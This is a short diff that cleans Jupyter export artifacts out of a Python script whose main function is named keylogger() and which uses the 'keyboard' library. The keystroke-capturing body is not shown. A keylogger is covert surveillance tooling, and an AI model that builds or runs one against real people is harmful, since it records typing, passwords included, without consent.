@@ -1,9 +1,3 @@
-#!/usr/bin/env python
-# coding: utf-8
-
-# In[ ]:
-
-
 import keyboard
 
 def keylogger():
@@ -40,16 +34,3 @@ def keylogger():
 
 if __name__ == "__main__":
     keylogger()
-
-
-# In[ ]:
-
-
-pip install keyboard
-
-
-# In[ ]:
-
-
-
-
